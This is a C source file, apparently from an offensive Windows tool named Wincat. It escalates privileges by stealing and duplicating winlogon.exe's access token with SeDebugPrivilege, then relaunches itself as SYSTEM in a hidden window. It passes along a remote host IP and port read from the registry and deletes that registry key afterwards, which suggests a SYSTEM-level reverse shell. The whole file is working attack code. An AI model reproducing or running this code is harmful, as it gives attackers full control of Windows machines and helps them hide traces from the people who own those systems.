// https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html



#include <Windows.h>
#include <tchar.h>
#include <stdio.h>

#include "Tools.h"
#include "Message.h"
#include "CheckSystem.h"
//#include "MgArguments.h"

#define SE_DEBUG_NAME_L	L"SeDebugPrivilege"

BOOL GetTargetHost(WCHAR** argurments, WCHAR* arg0) {
	DWORD RHostIPaddressSize = 128;
	DWORD RHostPortSize = 10;
	DWORD argurmentsSize = RHostIPaddressSize + RHostPortSize + 1 + (DWORD)wcslen(arg0);

	*argurments = (WCHAR*)calloc(argurmentsSize, sizeof(WCHAR));
	if (*argurments == NULL)
		return FALSE;
	char* RHostIPaddress = (char*)malloc(RHostIPaddressSize);
	if (RHostIPaddress != NULL) {
		char* RHostPort = (char*)malloc(RHostPortSize);
		if (RHostPort != NULL) {
			const char* regKey = "Software\\Wincat";
			if (ReadRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "RHostIP", RHostIPaddress, RHostIPaddressSize)) {
				if (ReadRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "RHostPORT", RHostPort, RHostPortSize)) {
					swprintf_s(*argurments, argurmentsSize, L"%s %hs %hs", arg0, RHostIPaddress, RHostPort);
					free(RHostPort);
					free(RHostIPaddress);
					return TRUE;
				}
			}
			free(RHostPort);
		}
		free(RHostIPaddress);
	}
	free(*argurments);
	return FALSE;
}



int GetSystem() {
	WCHAR* argurments;
	WCHAR* ProcessToRun = (WCHAR*)calloc(MAX_PATH, sizeof(WCHAR));
	if (ProcessToRun == NULL)
		return FALSE;
	if (GetModuleFileNameW(0, ProcessToRun, MAX_PATH) == 0){
		free(ProcessToRun);
		return FALSE;
	}

	if (GetTargetHost(&argurments, ProcessToRun)) {
		WCHAR* TargetProcess = L"winlogon.exe";
		DWORD pid = GetTargetProcessPID(TargetProcess);

		if (pid == 0){
			printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to find process %ws", TargetProcess);
			return FALSE;
		}
		if (!EnableWindowsPrivilege(SE_DEBUG_NAME_L)){
			printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Could not enable SeDebugPrivilege");
			return FALSE;
		}
		if (!CheckWindowsPrivilege(SE_DEBUG_NAME_L)){
			printMsg(STATUS_OK, LEVEL_DEFAULT, "I do not have SeDebugPrivilege!\n");
			return FALSE;
		}
		printMsg(STATUS_OK, LEVEL_DEFAULT, "SeDebugPrivilege set !\n");
		//printMsg(STATUS_OK, LEVEL_DEFAULT, "Pid Chosen: %d\n", pid);

		// Retrieves the remote process token.
		HANDLE pToken = GetAccessToken(pid);

		//These are required to call DuplicateTokenEx.
		SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
		TOKEN_TYPE tokenType = TokenPrimary;
		HANDLE pNewToken;
		if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, 0, seImpersonateLevel, tokenType, &pNewToken)){
			printMsg(STATUS_ERROR, LEVEL_DEFAULT, "ERROR: Could not duplicate process token");
			return TRUE;
		}
		printMsg(STATUS_OK, LEVEL_DEFAULT, "Process token has been duplicated.\n");

		/* Starts a new process with SYSTEM token */
		STARTUPINFOW StartupInfo;
		PROCESS_INFORMATION ProcessInfo;

		ZeroMemory(&StartupInfo, sizeof(STARTUPINFOW));
		ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
		StartupInfo.cb = sizeof(STARTUPINFOW);
		StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
		StartupInfo.wShowWindow = SW_HIDE;

		if (GetTargetHost(&argurments, ProcessToRun)){
			printMsg(STATUS_INFO, LEVEL_VERBOSE, "Args: %ws\n", argurments);
			DeleteRegistryKey(HKEY_CURRENT_USER, (char*)"Software", "Wincat");
			if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, ProcessToRun, argurments, CREATE_NEW_CONSOLE, NULL, NULL, &StartupInfo, &ProcessInfo)){
				printMsg(STATUS_ERROR, LEVEL_DEFAULT, "ERROR: CreateProcessWithTokenW");
				free(argurments);
				free(ProcessToRun);
				return TRUE;
			}
			CloseHandle(ProcessInfo.hThread);
			CloseHandle(ProcessInfo.hProcess);
			free(argurments);
			free(ProcessToRun);
		}
		DeleteRegistryKey(HKEY_CURRENT_USER, (char*)"Software", "Wincat");
		printMsg(STATUS_OK, LEVEL_DEFAULT, "Process created !\n");
	}	
	return FALSE;
}
